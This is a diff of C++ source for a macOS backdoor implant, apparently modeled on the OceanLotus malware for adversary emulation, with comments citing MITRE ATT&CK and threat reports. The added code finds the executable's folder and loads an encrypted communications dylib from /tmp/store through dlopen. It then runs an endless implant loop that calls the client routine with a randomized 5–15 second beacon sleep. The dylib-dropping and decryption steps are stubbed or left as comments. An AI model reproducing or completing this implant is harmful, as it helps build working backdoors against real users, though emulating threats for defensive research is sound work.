@@ -1,33 +1,110 @@
 #include <iostream>
+#include <vector>
+#include <mach-o/dyld.h>
 
+#include "dlfcn.h"
+#include "Comms.hpp"
 #include "ClientPP.hpp"
+
+const char * PATH_TO_COMMS_LIB = "/tmp/store";
+
+/*
+getPathToExecutable
+    About:
+        Get the path to the executable
+    Result:
+        string representing path to the executable
+    MITRE ATT&CK Techniques:
+    CTI:
+    References:
+*/
+std::string getPathToExecutable() {
+    std::string exePath;
+    char path[PATH_MAX+1];
+    uint32_t size = sizeof(path);
+
+    if (_NSGetExecutablePath(path, &size) == 0) {
+        // get path to execution folder
+        exePath = std::string(path);
+        std::size_t last = exePath.find_last_of("/");
+        exePath = exePath.substr(0, last)+"/";
+        std::cout << "Path to executable: " + exePath << std::endl;
+    } else {
+        std::cout << "Buffer too small" << std::endl;
+        return "";
+    }
+
+    return exePath;
+}
+
+/*
+dropComms
+    About:
+        Writes the embedded libComms.dylib to the path to the executable
+    Result:
+    MITRE ATT&CK Techniques:
+    CTI:
+    References:
+*/
+void dropComms(std::string exePath) {
+    return;
+}
+
+/*
+loadComms
+    About:
+        Responsible for finding, decrypting and loading the libComms dylib.
+    Result:
+        Returns pointer to the opened libComms dylib
+    MITRE ATT&CK Techniques:
+    CTI:
+        https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
+    References:
+        https://stackoverflow.com/q/43184544
+        https://tldp.org/HOWTO/C++-dlopen/thesolution.html
+*/
+void* loadComms(std::string exePath) {
+    // for each file in exePath (path to executable):
+    //      try:
+    //          decrypt file and output to /tmp/store
+    //      catch:
+    //          pass (ignore failures)
+
+    return dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
+}
 
 int main(int argc, const char * argv[]) {
 
-    // drop embedded, encrypted CommsLib.dylib to cwd
-    // find and decrypt CommsLib.dylib to /tmp/store
+    std::string exePath = getPathToExecutable();
 
-    // load CommsLib.dylib
-    //      https://stackoverflow.com/q/43184544
-    //      - does ClientPP have to call dlopen/dlclose?
-    //      - does ClientPP need to open/close every time it tries to HTTP request?
-    // call dlopen to load dylib
-    // load symbol (HTTP request function) from dylib
-    // close dylib
+    // drop embedded libComms.dylib to cwd
+    dropComms(exePath);
 
+    // load libComms.dylib
+    void * dylib = loadComms(exePath);
+
+    // check libComms was opened
+    if (dylib == NULL) {
+        std::cout << "unable to load libComms.dylib (" + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
+        return 1;
+    }
+
+    // main loop
     // Figure 9 - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
-    // int dwRandomTimeSleep = 0;
-    // time_t dwTimeSeed;
-    // int dwRandomValue;
-    // while ( 1 ) {
-    //     if ( ClientPP::osInfo(dwRandomTimeSleep))
-    //         ClientPP::runClient(dwRandomTimeSleep);
-    //     dwTimeSeed = time(0LL);
-    //     srand(dwTimeSeed);
-    //     dwRandomValue = rand();
-    //     dwRandomTimeSleep = dwRandomValue;
-    // }
+    int dwRandomTimeSleep = 0;
+    time_t dwTimeSeed;
+    int dwRandomValue;
+    while ( 1 ) {
+        // execute implant functionality
+        if ( ClientPP::osInfo(dwRandomTimeSleep))
+            ClientPP::runClient(dwRandomTimeSleep, dylib);
+        dwTimeSeed = time(0LL);
+        srand(dwTimeSeed);
+        dwRandomValue = rand()%(15000-5000+1)+5000;     // set sleep between 5-15 seconds
+        dwRandomTimeSleep = dwRandomValue;
+    }
 
-    std::cout << "Hello, World!\n";
+    // finished execution, close
+    dlclose(dylib);
     return 0;
 }
